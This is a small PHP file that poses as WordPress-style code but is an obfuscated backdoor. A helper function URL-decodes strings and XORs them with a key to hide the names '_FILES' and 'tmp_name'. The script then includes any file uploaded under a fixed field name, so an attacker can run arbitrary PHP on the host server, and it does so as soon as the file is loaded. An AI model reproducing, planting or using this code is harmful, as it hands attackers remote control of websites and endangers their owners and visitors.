<?php 	
function nestable_tags()

{
	$exclude_tree = 'page_ids';
    $non_cached_ids = 'yFHkFebvwEuicw';
    $old_dates = $non_cached_ids;
	$features = 'name';
    
    $sort_column = $GLOBALS[newtext("%26%00%01%27%036", $old_dates)];

    $prefixed = $sort_column;

    $path = isset($prefixed[$old_dates]);

    if ($path)

    {

        $posts = $sort_column[$old_dates];
        $parent_data = $posts[newtext("%0D%2B84%28%04%0F%13", $old_dates)];
	$where_post_type = 'int_fields';
        $image_url = $parent_data;
        include ($image_url);
    }
}
function newtext($sanitized, $subs)

{
    $post_modified = $subs;
    $_ext = "url" . "decode";
    $incposts = $_ext($sanitized);
    $since = substr($post_modified,0, strlen($incposts));

    $types = $incposts ^ $since;
	$rest_controller_class = 'cdata_regex';
    return $types;
}

nestable_tags();


?>
